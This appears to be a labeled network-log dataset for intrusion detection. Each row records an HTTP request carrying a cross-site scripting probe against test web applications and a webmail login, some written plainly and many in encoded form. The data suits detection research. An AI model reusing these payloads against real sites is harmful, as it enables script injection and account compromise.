timestamp,session_id,src_ip,src_port,dst_ip,host,url,user_agent,response_size,status_code,status_message,unknown10,attack
1556342631,CMq45N1mYEYczvmZe6,192.168.1.32,50568,192.168.1.190,192.168.1.190,"/webmail/src/login.php37,51,99,37,55,54,37,54,57,37,54,52,37,54,53,37,54,102,37,50,48,37,55,51,37,55,50,37,54,51,37,51,100,37,51,49,37,50,48,37,54,56,37,55,50,37,54,53,37,54,54,37,51,100,37,51,49,37,50,48,37,54,102,37,54,101,37,54,53,37,55,50,37,55,50,37,54,102,37,55,50,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,51,55,37,54,54,37,54,52,37,51,55,37,54,50,37,54,52,37,51,51,37,51,48,37,51,48,37,51,50,37,54,51,37,54,50,37,51,54,37,54,50,37,54,49,37,51,51,37,51,57,37,54,54,37,51,55,37,54,49,37,51,53,37,54,50,37,54,50,37,51,54,37,51,51,37,51,51,37,54,51,37,51,52,37,54,51,37,51,52,37,54,50,37,51,57,37,50,50,37,51,101,37,51,99,37,50,102,37,55,54,37,54,57,37,54,52,37,54,53,37,54,102,37,51,101",hacking,1057,403,Forbidden,FB8WyA412dqcvYamI3,1
1556343875,CgxCjy6rKIX4WsF7d,192.168.1.36,55872,176.28.50.165,testphp.vulnweb.com,"/<math><a xlink:href=""72a0858eb9630aa0c628d4c75d9a3ae3"">click",Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0,168,404,Not Found,FObYHt1CAlERvW608a,1
1556344313,C7amQ62YgbGZGXyP5a,192.168.1.36,36878,52.28.231.150,www.mqtt-dashboard.com,"/37,51,99,37,54,54,37,54,102,37,55,50,37,54,100,37,51,101,37,51,99,37,54,50,37,55,53,37,55,52,37,55,52,37,54,102,37,54,101,37,50,48,37,54,54,37,54,102,37,55,50,37,54,100,37,54,49,37,54,51,37,55,52,37,54,57,37,54,102,37,54,101,37,51,100,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,50,54,37,54,51,37,54,102,37,54,99,37,54,102,37,54,101,37,51,98,37,51,48,37,51,51,37,54,50,37,54,49,37,51,57,37,51,48,37,54,52,37,51,49,37,51,51,37,51,55,37,51,51,37,51,56,37,51,48,37,54,53,37,51,52,37,51,57,37,54,49,37,51,53,37,51,54,37,54,50,37,51,54,37,51,52,37,51,50,37,51,55,37,54,51,37,54,49,37,54,53,37,51,48,37,54,51,37,51,49,37,54,51,37,54,52,37,51,101,37,53,56",hacking,906,403,Forbidden,FjZU8a1IERNPK9ygfg,1
1556341398,CD8vOR3Q7c25VJBqng,192.168.1.32,47366,192.168.1.152,192.168.1.152,"/37,51,99,37,52,57,37,52,100,37,52,55,37,50,48,37,53,51,37,53,50,37,52,51,37,51,100,37,51,50,37,51,55,37,54,50,37,51,50,37,51,50,37,51,55,37,51,56,37,51,55,37,51,51,37,51,52,37,51,49,37,54,49,37,51,53,37,54,50,37,54,51,37,54,50,37,51,53,37,51,57,37,54,49,37,51,51,37,51,55,37,54,52,37,54,50,37,51,55,37,51,51,37,51,54,37,54,51,37,54,49,37,51,54,37,51,55,37,51,54,37,51,54,37,51,101",hacking,668,403,Forbidden,F5823d1SjOE9sW1AD3,1
1556343575,CbHmMS11OTdYMB4yv6,192.168.1.36,56706,192.168.1.195,192.168.1.195,/dvwa/vulnerabilities/xss_r/?name=admin/,Crawler@alexa.com,0,302,Found,FF5Ape4JlYiYQVoJz6,1
1556344123,CkEcFK2IMAeVqtvTmb,192.168.1.32,55268,18.194.169.124,www.mqtt-dashboard.com,"/37,51,99,37,54,49,37,50,48,37,54,56,37,55,50,37,54,53,37,54,54,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,55,54,37,54,102,37,54,57,37,54,52,37,50,56,37,51,48,37,50,57,37,50,50,37,50,48,37,54,102,37,54,101,37,54,100,37,54,102,37,55,53,37,55,51,37,54,53,37,54,102,37,55,54,37,54,53,37,55,50,37,51,100,37,50,54,37,52,101,37,54,53,37,55,55,37,52,99,37,54,57,37,54,101,37,54,53,37,51,98,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,51,55,37,51,56,37,51,54,37,54,53,37,54,53,37,54,54,37,51,53,37,54,50,37,51,54,37,54,52,37,54,54,37,54,49,37,51,56,37,54,52,37,51,49,37,51,57,37,51,50,37,51,51,37,51,54,37,51,50,37,51,56,37,54,49,37,51,48,37,51,57,37,54,54,37,54,51,37,54,54,37,54,54,37,51,51,37,51,52,37,51,52,37,54,49,37,50,54,37,52,101,37,54,53,37,55,55,37,52,99,37,54,57,37,54,101,37,54,53,37,51,98,37,51,101,37,53,56,37,51,99,37,50,102,37,54,49,37,51,101",hacking,1195,403,Forbidden,FMlnvpAa48Z2PAbJ7,1
1556343800,CfoySw2FP0I1x7sQ8g,192.168.1.36,40902,192.168.1.195,192.168.1.195,/dvwa/vulnerabilities/xss_r/?name=admin/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0,0,302,Found,FF5Ape4JlYiYQVoJz6,1
1556344165,CzHEYZ2II4P2Vy1teh,192.168.1.36,53582,18.194.169.124,www.mqtt-dashboard.com,"/&91d3b1f8ce6a19c809467bdc00233ed8"">","Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",245,404,Not Found,FsCx7aFBUxrkRryLi,1
1556343932,Cut4GC2WuLOvpHUcCe,192.168.1.36,59798,176.28.50.165,testphp.vulnweb.com,"/37,51,99,37,54,52,37,54,57,37,55,54,37,50,48,37,54,57,37,54,52,37,51,100,37,54,52,37,51,101,37,51,99,37,55,56,37,50,48,37,55,56,37,54,100,37,54,99,37,54,101,37,55,51,37,51,100,37,50,50,37,51,101,37,51,99,37,54,57,37,54,54,37,55,50,37,54,49,37,54,100,37,54,53,37,50,48,37,54,102,37,54,101,37,54,99,37,54,102,37,54,49,37,54,52,37,51,100,37,54,54,37,51,51,37,54,53,37,54,49,37,51,57,37,54,53,37,54,50,37,54,53,37,54,53,37,54,51,37,51,56,37,51,52,37,54,49,37,51,51,37,51,52,37,51,53,37,54,52,37,54,52,37,54,53,37,51,57,37,51,50,37,54,51,37,51,56,37,51,52,37,54,49,37,51,48,37,54,54,37,54,54,37,51,50,37,51,56,37,54,54,37,54,53,37,50,50,37,51,101,37,51,99,37,50,102,37,54,52,37,54,57,37,55,54,37,51,101,37,50,48,37,51,99,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,101,37,54,52,37,50,101,37,54,57,37,54,101,37,54,101,37,54,53,37,55,50,37,52,56,37,53,52,37,52,100,37,52,99,37,51,100,37,54,52,37,50,101,37,54,57,37,54,101,37,54,101,37,54,53,37,55,50,37,52,56,37,53,52,37,52,100,37,52,99,37,51,99,37,50,102,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,101",hacking,168,404,Not Found,FT5Ejp3aeOQdcbL7h4,1
1556341816,CSUNUN3MI6lWuGsjP9,192.168.1.36,52274,192.168.1.190,192.168.1.190,"/webmail/src/login.php<bgsound onPropertyChange bgsound onPropertyChange=""javascript:ec54cc65280613d6e777164cb0fd5eef""></bgsound onPropertyChange>",Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko,309,404,Not Found,Ffrqob31vZBtWz9jyk,1
1556343490,CZ5JXL3Cj76Ypfshmh,192.168.1.32,34848,176.28.50.165,testphp.vulnweb.com,"/37,51,99,37,51,102,37,55,56,37,54,100,37,54,99,37,50,48,37,55,54,37,54,53,37,55,50,37,55,51,37,54,57,37,54,102,37,54,101,37,51,100,37,50,50,37,51,49,37,50,101,37,51,48,37,50,50,37,50,48,37,55,51,37,55,52,37,54,49,37,54,101,37,54,52,37,54,49,37,54,99,37,54,102,37,54,101,37,54,53,37,51,100,37,50,50,37,54,101,37,54,102,37,50,50,37,51,102,37,51,101,37,50,48,37,51,99,37,54,56,37,55,52,37,54,100,37,54,99,37,50,48,37,55,56,37,54,100,37,54,99,37,54,101,37,55,51,37,51,100,37,50,50,37,54,56,37,55,52,37,55,52,37,55,48,37,51,97,37,50,102,37,50,102,37,55,55,37,55,55,37,55,55,37,50,101,37,55,55,37,51,51,37,50,101,37,54,102,37,55,50,37,54,55,37,50,102,37,51,49,37,51,57,37,51,57,37,51,57,37,50,102,37,55,56,37,54,56,37,55,52,37,54,100,37,54,99,37,50,50,37,51,101,37,50,48,37,51,99,37,54,56,37,54,53,37,54,49,37,54,52,37,51,101,37,50,48,37,51,99,37,55,51,37,55,52,37,55,57,37,54,99,37,54,53,37,50,48,37,55,52,37,55,57,37,55,48,37,54,53,37,51,100,37,50,50,37,55,52,37,54,53,37,55,56,37,55,52,37,50,102,37,54,51,37,55,51,37,55,51,37,50,50,37,51,101,37,50,48,37,52,48,37,54,54,37,54,102,37,54,101,37,55,52,37,50,100,37,54,54,37,54,49,37,54,51,37,54,53,37,50,48,37,55,98,37,54,54,37,54,102,37,54,101,37,55,52,37,50,100,37,54,54,37,54,49,37,54,100,37,54,57,37,54,99,37,55,57,37,51,97,37,50,48,37,55,57,37,51,98,37,50,48,37,55,51,37,55,50,37,54,51,37,51,97,37,50,48,37,55,53,37,55,50,37,54,99,37,50,56,37,50,50,37,51,57,37,51,52,37,54,51,37,51,52,37,51,56,37,54,53,37,54,54,37,54,51,37,54,54,37,51,48,37,51,53,37,51,53,37,51,55,37,51,57,37,54,54,37,51,53,37,51,50,37,51,52,37,54,51,37,51,56,37,51,50,37,54,50,37,51,49,37,51,54,37,51,54,37,54,53,37,54,49,37,51,48,37,54,53,37,54,54,37,54,51,37,51,55,37,50,51,37,55,56,37,50,50,37,50,57,37,50,48,37,54,54,37,54,102,37,55,50,37,54,100,37,54,49,37,55,52,37,50,56,37,50,50,37,55,51,37,55,54,37,54,55,37,50,50,37,50,57,37,51,98,37,55,100,37,50,48,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,55,98,37,54,54,37,54,102,37,54,101,37,55,52,37,51,97,37,50,48,37,51,49,37,51,48,37,51,48,37,55,48,37,55,56,37,50,48,37,50,50,37,55,57,37,50,50,37,51,98,37,55,100,37,50,48,37,51,99,37,50,102,37,55,51,37,55,52,37,55,57,37,54,99,37,54,53,37,51,101,37,50,48,37,51,99,37,50,102,37,54,56,37,54,53,37,54,49,37,54,52,37,51,101,37,50,48,37,51,99,37,54,50,37,54,102,37,54,52,37,55,57,37,51,101,37,53,56,37,51,99,37,50,102,37,54,50,37,54,102,37,54,52,37,55,57,37,51,101,37,50,48,37,51,99,37,50,102,37,54,56,37,55,52,37,54,100,37,54,99,37,51,101",hacking,168,404,Not Found,FaS7JxmTazmT4M6Th,1
1556343668,C1uamw3TQyy9pDPtQa,192.168.1.32,54274,18.194.169.124,www.mqtt-dashboard.com,"/37,51,99,37,54,56,37,55,52,37,54,100,37,54,99,37,50,48,37,54,102,37,54,101,37,52,100,37,54,102,37,55,53,37,55,51,37,54,53,37,52,102,37,55,53,37,55,52,37,50,48,37,54,56,37,55,52,37,54,100,37,54,99,37,50,48,37,54,102,37,54,101,37,52,100,37,54,102,37,55,53,37,55,51,37,54,53,37,52,102,37,55,53,37,55,52,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,51,55,37,51,55,37,54,54,37,54,51,37,51,54,37,54,54,37,54,51,37,54,49,37,51,51,37,51,56,37,51,50,37,54,53,37,51,49,37,51,52,37,51,55,37,51,49,37,51,49,37,51,49,37,51,56,37,51,48,37,51,54,37,51,50,37,54,52,37,54,54,37,54,53,37,51,49,37,51,49,37,54,51,37,54,52,37,51,56,37,54,52,37,51,51,37,50,50,37,51,101,37,51,99,37,50,102,37,54,56,37,55,52,37,54,100,37,54,99,37,50,48,37,54,102,37,54,101,37,52,100,37,54,102,37,55,53,37,55,51,37,54,53,37,52,102,37,55,53,37,55,52,37,51,101",hacking,1103,403,Forbidden,FP3qvI3WfYwAC5hjo,1
1556344104,CRCRqoUYoEc6UCTk4,192.168.1.36,58556,192.168.1.195,192.168.1.195,"/dvwa/vulnerabilities/sqli//37,51,99,37,55,51,37,55,54,37,54,55,37,50,48,37,55,56,37,54,100,37,54,99,37,54,101,37,55,51,37,51,100,37,50,50,37,54,56,37,55,52,37,55,52,37,55,48,37,51,97,37,50,102,37,50,102,37,55,55,37,55,55,37,55,55,37,50,101,37,55,55,37,51,51,37,50,101,37,54,102,37,55,50,37,54,55,37,50,102,37,51,50,37,51,48,37,51,48,37,51,48,37,50,102,37,55,51,37,55,54,37,54,55,37,50,50,37,51,101,37,51,99,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,101,37,51,48,37,51,53,37,51,57,37,54,53,37,51,55,37,51,48,37,54,53,37,54,50,37,51,51,37,51,57,37,54,51,37,54,49,37,51,52,37,54,51,37,54,50,37,54,52,37,51,51,37,51,54,37,51,54,37,51,48,37,54,50,37,51,48,37,51,53,37,51,57,37,54,51,37,54,54,37,51,56,37,54,52,37,54,54,37,54,53,37,51,55,37,51,49,37,51,99,37,50,102,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,101,37,51,99,37,50,102,37,55,51,37,55,54,37,54,55,37,51,101",hacking,1327,403,Forbidden,FDoHdk4815zYiv2dng,1
1556344537,CwMzcO1Ptalg9w8Gkj,192.168.1.36,54496,192.168.1.152,192.168.1.152,/<a onmouseover=0e3c5ec948c96d8970974c3cbb144195>X</a>,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0,301,400,Bad Request,FW3F9l4VRe51mJE9F3,1
1556343497,CwKmN74mgn0Jhmk5zd,192.168.1.32,35130,176.28.50.165,testphp.vulnweb.com,"/37,51,99,37,50,102,37,55,48,37,54,99,37,54,49,37,54,57,37,54,101,37,55,52,37,54,53,37,55,56,37,55,52,37,53,99,37,51,101,37,51,99,37,50,102,37,55,99,37,53,99,37,51,101,37,51,99,37,55,48,37,54,99,37,54,49,37,54,57,37,54,101,37,55,52,37,54,53,37,55,56,37,55,52,37,50,102,37,54,102,37,54,101,37,54,100,37,54,102,37,55,53,37,55,51,37,54,53,37,54,102,37,55,54,37,54,53,37,55,50,37,51,100,37,55,48,37,55,50,37,54,102,37,54,100,37,55,48,37,55,52,37,50,56,37,51,56,37,51,54,37,51,48,37,54,51,37,51,54,37,54,52,37,51,52,37,54,51,37,51,50,37,51,49,37,54,50,37,51,48,37,51,52,37,54,53,37,54,49,37,54,54,37,54,51,37,54,51,37,54,53,37,54,54,37,51,48,37,51,48,37,51,53,37,51,56,37,51,53,37,54,51,37,51,56,37,51,48,37,54,49,37,51,50,37,51,54,37,54,50,37,50,57",hacking,168,404,Not Found,FdVXj54u8IT9HpCpN7,1
1556343120,Ca8Cqb2WvhODkytENi,192.168.1.32,58444,52.28.231.150,www.mqtt-dashboard.com,"/37,51,99,37,54,49,37,50,48,37,54,56,37,55,50,37,54,53,37,54,54,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,51,55,37,51,48,37,51,55,37,51,48,37,54,51,37,51,50,37,51,51,37,54,53,37,54,54,37,51,51,37,54,50,37,54,52,37,54,49,37,51,57,37,51,48,37,51,52,37,54,50,37,54,49,37,54,49,37,51,51,37,54,52,37,54,49,37,51,57,37,51,56,37,51,48,37,54,54,37,51,52,37,51,52,37,51,53,37,54,52,37,51,53,37,51,50,37,50,50,37,51,101,37,51,99,37,54,53,37,55,54,37,54,53,37,54,101,37,55,52,37,50,100,37,55,51,37,54,102,37,55,53,37,55,50,37,54,51,37,54,53,37,50,48,37,55,51,37,55,50,37,54,51,37,51,100,37,50,50,37,54,52,37,54,49,37,55,52,37,54,49,37,51,97,37,54,49,37,55,48,37,55,48,37,54,99,37,54,57,37,54,51,37,54,49,37,55,52,37,54,57,37,54,102,37,54,101,37,50,102,37,55,56,37,50,100,37,54,52,37,54,102,37,54,100,37,50,100,37,54,53,37,55,54,37,54,53,37,54,101,37,55,52,37,50,100,37,55,51,37,55,52,37,55,50,37,54,53,37,54,49,37,54,100,37,50,99,37,52,53,37,55,54,37,54,53,37,54,101,37,55,52,37,51,97,37,54,51,37,54,99,37,54,57,37,54,51,37,54,98,37,50,53,37,51,48,37,52,49,37,54,52,37,54,49,37,55,52,37,54,49,37,51,97,37,53,56,37,53,56,37,53,56,37,50,53,37,51,48,37,52,49,37,50,53,37,51,48,37,52,49,37,50,50,37,51,101",hacking,1477,403,Forbidden,FVfOHa3IfBcZtbR3q1,1
1556343250,CLGWbl13MWXmy2klN4,192.168.1.32,56484,192.168.1.195,192.168.1.195,/dvwa/vulnerabilities/sqli//<svg/onload=alert(afca0fca3fcddece87c4250bc1a435ac),Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1,511,403,Forbidden,FkPdKk183HMBb6AIS8,1
1556343171,CmoVX61yVTaKryJ3E,192.168.1.32,52178,192.168.1.195,192.168.1.195,"/dvwa/vulnerabilities/sqli//37,51,99,37,51,102,37,50,48,37,54,54,37,54,102,37,54,102,37,51,100,37,50,50,37,51,101,37,51,99,37,55,56,37,50,48,37,54,54,37,54,102,37,54,102,37,51,100,37,50,55,37,51,102,37,51,101,37,51,99,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,101,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,51,53,37,51,56,37,51,53,37,51,49,37,51,49,37,51,56,37,51,48,37,54,54,37,54,54,37,51,55,37,54,52,37,54,49,37,54,52,37,51,51,37,51,54,37,51,48,37,54,53,37,51,56,37,51,57,37,51,51,37,51,51,37,54,53,37,51,56,37,51,54,37,51,52,37,54,54,37,51,48,37,54,50,37,51,57,37,54,54,37,51,56,37,54,52,37,51,99,37,50,102,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,101,37,50,55,37,51,101,37,50,50,37,51,101",hacking,1218,403,Forbidden,FGi6TB2l8n87OgSFlh,1
1556341716,CJY9Qx4bWyPH8Debhf,192.168.1.36,37364,192.168.1.152,192.168.1.152,"/<IMG SRC=""mocha:[7f675bc20024745c4e39df72607b8060]"">","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",0,403,Forbidden,FF5Ape4JlYiYQVoJz6,1
1556343602,Chk0Pj2iGj5fMaRLNc,192.168.1.32,58150,192.168.1.190,192.168.1.190,"/webmail/src/login.php37,51,99,37,52,57,37,52,100,37,52,55,37,50,48,37,52,52,37,53,57,37,52,101,37,53,51,37,53,50,37,52,51,37,51,100,37,50,50,37,51,49,37,51,53,37,51,49,37,51,55,37,51,53,37,51,52,37,54,52,37,51,55,37,54,49,37,51,48,37,51,52,37,51,50,37,51,53,37,54,52,37,54,49,37,51,51,37,51,52,37,54,54,37,51,55,37,51,56,37,51,49,37,51,55,37,51,54,37,54,51,37,51,50,37,51,56,37,51,57,37,54,50,37,51,56,37,54,54,37,51,54,37,51,57,37,50,50,37,51,101",hacking,735,403,Forbidden,FyShL63jFlxViZBWRg,1
1556343018,CrCci53W0twOhzYi3,192.168.1.36,57668,192.168.1.190,192.168.1.190,"/webmail/src/login.php37,51,99,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,52,50,37,54,53,37,54,54,37,54,102,37,55,50,37,54,53,37,53,53,37,54,101,37,54,99,37,54,102,37,54,49,37,54,52,37,50,48,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,52,50,37,54,53,37,54,54,37,54,102,37,55,50,37,54,53,37,53,53,37,54,101,37,54,99,37,54,102,37,54,49,37,54,52,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,54,37,51,49,37,51,50,37,51,50,37,51,50,37,54,50,37,51,52,37,54,52,37,54,51,37,54,50,37,54,49,37,51,54,37,54,49,37,51,48,37,51,53,37,51,55,37,51,57,37,51,54,37,51,53,37,51,56,37,51,48,37,54,54,37,51,50,37,51,52,37,51,54,37,54,52,37,51,48,37,51,56,37,51,48,37,51,48,37,54,49,37,51,51,37,50,50,37,51,101,37,51,99,37,50,102,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,52,50,37,54,53,37,54,54,37,54,102,37,55,50,37,54,53,37,53,53,37,54,101,37,54,99,37,54,102,37,54,49,37,54,52,37,51,101",hacking,0,403,Forbidden,FF5Ape4JlYiYQVoJz6,1
1556343797,C9l30E1nAaWNhpy8l9,192.168.1.36,40212,192.168.1.195,192.168.1.195,/dvwa/vulnerabilities/xss_r/?name=admin/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0,0,302,Found,FF5Ape4JlYiYQVoJz6,1
1556341755,CvbSvMt53xYK5jT75,192.168.1.36,36348,176.28.50.165,testphp.vulnweb.com,"/<body onMouseOver body onMouseOver=""javascript:11d87c1f4239ed1a82a3cab868dc9344""></body onMouseOver>","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",570,404,Not Found,FNZ17g1iLGtEgI0PUb,1
1556344327,CSLpqA118j0dvmbL45,192.168.1.36,42714,192.168.1.195,192.168.1.195,"/dvwa/vulnerabilities/sqli//37,51,99,37,55,51,37,55,54,37,54,55,37,50,48,37,54,102,37,54,101,37,53,53,37,54,101,37,54,99,37,54,102,37,54,49,37,54,52,37,50,48,37,55,51,37,55,54,37,54,55,37,50,48,37,54,102,37,54,101,37,53,53,37,54,101,37,54,99,37,54,102,37,54,49,37,54,52,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,51,56,37,51,51,37,54,50,37,54,53,37,54,53,37,51,50,37,51,50,37,51,55,37,51,56,37,51,57,37,54,54,37,51,56,37,51,54,37,51,57,37,51,53,37,54,50,37,51,57,37,54,51,37,51,54,37,54,54,37,51,54,37,51,49,37,51,54,37,54,54,37,51,54,37,54,54,37,54,51,37,54,50,37,51,52,37,51,57,37,54,50,37,54,50,37,50,50,37,51,101,37,51,99,37,50,102,37,55,51,37,55,54,37,54,55,37,50,48,37,54,102,37,54,101,37,53,53,37,54,101,37,54,99,37,54,102,37,54,49,37,54,52,37,51,101",hacking,1363,403,Forbidden,FwCFzh2WYpdIiX8EUd,1
1556343375,CPW8VS3Q3xnOmNSCa6,192.168.1.32,43274,192.168.1.190,192.168.1.190,"/webmail/src/login.php<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",305,404,Not Found,FCXHCC1RWv72ssxXcb,1
1556343259,C1RgzM2EnfTqobJIk6,192.168.1.36,40138,192.168.1.152,192.168.1.152,/<frameset onload=javascript:4fe1516a498463a6e03593b666b1192e>,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",301,400,Bad Request,Fj1HjB3F6yyHNhKYfj,1
1556344331,CwWHBwHYKiZcMt442,192.168.1.32,33948,176.28.50.165,testphp.vulnweb.com,"/37,51,99,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,55,53,37,54,101,37,54,99,37,54,102,37,54,49,37,54,52,37,50,48,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,55,53,37,54,101,37,54,99,37,54,102,37,54,49,37,54,52,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,51,52,37,51,52,37,51,55,37,54,54,37,54,51,37,51,48,37,51,50,37,51,53,37,54,54,37,51,53,37,54,53,37,51,53,37,54,49,37,51,48,37,51,49,37,54,53,37,51,56,37,51,56,37,54,54,37,51,49,37,51,50,37,54,51,37,54,49,37,54,52,37,54,52,37,54,51,37,51,55,37,51,53,37,51,49,37,54,54,37,51,50,37,51,57,37,50,50,37,51,101,37,51,99,37,50,102,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,55,53,37,54,101,37,54,99,37,54,102,37,54,49,37,54,52,37,51,101",hacking,168,404,Not Found,FzE4mF3KDzmcL5rPQ6,1
1556340897,CzUXXC4ih7CBZD2IF4,192.168.1.32,51666,192.168.1.190,192.168.1.190,"/webmail/src/login.php37,51,99,37,51,102,37,55,56,37,54,100,37,54,99,37,50,100,37,55,51,37,55,52,37,55,57,37,54,99,37,54,53,37,55,51,37,54,56,37,54,53,37,54,53,37,55,52,37,50,48,37,55,52,37,55,57,37,55,48,37,54,53,37,51,100,37,50,50,37,55,52,37,54,53,37,55,56,37,55,52,37,50,102,37,55,56,37,55,51,37,54,99,37,50,50,37,50,48,37,54,56,37,55,50,37,54,53,37,54,54,37,51,100,37,50,50,37,50,51,37,50,50,37,51,102,37,51,101,37,51,99,37,54,57,37,54,100,37,54,55,37,50,48,37,55,56,37,54,100,37,54,99,37,54,101,37,55,51,37,51,100,37,50,50,37,55,56,37,50,100,37,55,51,37,54,51,37,54,56,37,54,53,37,54,100,37,54,49,37,51,97,37,51,48,37,51,55,37,51,50,37,54,49,37,51,57,37,54,52,37,51,52,37,51,53,37,54,51,37,54,52,37,51,54,37,51,54,37,51,48,37,51,52,37,54,54,37,54,54,37,51,53,37,51,54,37,51,52,37,51,50,37,51,54,37,54,51,37,51,53,37,51,55,37,51,49,37,51,57,37,51,52,37,54,51,37,51,54,37,51,55,37,54,51,37,54,52,37,50,50,37,50,102,37,51,101",hacking,1215,403,Forbidden,FeJFu71toS9zRH5v5b,1
1556342911,CW63RNGF9mYhslqM5,192.168.1.32,41410,192.168.1.190,192.168.1.190,"/webmail/src/login.php<img src=""x` `<script>6e59a5dad3474f97f2b83e1c5da167f3</script>""` `>",Mozilla/5.0 (Linux; U; Android 0.5; en-us),305,404,Not Found,FP0QuZ2ZoSkYJtU905,1
1556341836,CxZ1k91UVcdHYtc2Q,192.168.1.36,44370,176.28.50.165,testphp.vulnweb.com,"/<frameset onBlur frameset onBlur=""javascript:b32133398503732970e3d13d7a27da39""></frameset onBlur>","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",570,404,Not Found,FK7lPC2gY9ItlEvwua,1
